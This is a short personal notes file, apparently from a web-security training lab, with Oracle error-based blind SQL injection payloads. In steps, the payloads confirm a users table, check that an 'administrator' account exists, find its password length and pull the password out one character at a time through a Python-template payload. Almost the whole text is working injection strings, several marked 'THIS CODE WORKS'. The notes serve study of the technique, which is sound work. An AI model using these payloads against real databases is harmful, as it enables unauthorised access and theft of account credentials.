usefull code:

* we are working with oracle database


' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTR(Password, 1, 1) > 'letter_here') THEN TO_CHAR 1/0 ELSE 'a' END FROM Users)='a -- 

' || (select '' from dual) || ' ====>   THIS CODE WORKS

conforming there is a user table"

' || (select '' from users where rownum = 1) || '  ====>   THIS CODE WORKS

cheking if admin exist in users table:

' || (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '

' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '

if you get error it mean administrator user exists if the user dosent exist you will get 200 ok
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '

determin the length of password:
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>1) || '


we found out that the length of the password is 20

python scripy payload:

' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(SUBSTR(password,%s,1)) = '%s' ) || '

https://0ab700d4041a859a8094e92a00fd0014.web-security-academy.net/










